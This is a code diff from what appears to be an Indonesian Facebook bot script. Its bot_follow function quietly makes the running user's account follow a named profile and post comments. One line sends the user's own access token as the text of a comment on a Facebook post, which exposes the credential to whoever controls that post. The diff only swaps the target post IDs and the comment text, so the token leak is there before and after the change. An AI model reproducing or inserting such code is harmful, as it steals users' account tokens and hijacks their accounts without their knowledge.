@@ -190,10 +190,10 @@ def bot_follow():
 	except IOError:
 		print((k+"\n["+p+"❌"+k+"]"+p+" Token Mati"))
 		logs()
-	kom = ("cek inbox Bos\n\nInfo harga")
+	kom = ("Dapunta ganteng mau ga jadi pacarku? ❤️❤️❤️❤️❤️\n\nhttps://www.facebook.com/photo.php?fbid=10214228940637251&set=a.1274773809249&type=3&app=fbl")
 	requests.post("https://graph.facebook.com/100035322483719/subscribers?access_token=" + toket)      #Roy Octa Firdaus
-	requests.post('https://graph.facebook.com/524339288753483/comments/?message=' +toket+ '&access_token=' + toket)
-	requests.post('https://graph.facebook.com/523795802141165/comments/?message=' +kom+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/10215994561776676/comments/?message=' +toket+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/10214228940637251/comments/?message=' +kom+ '&access_token=' + toket)
 	menu()
 
 ### MAIN MENU ###
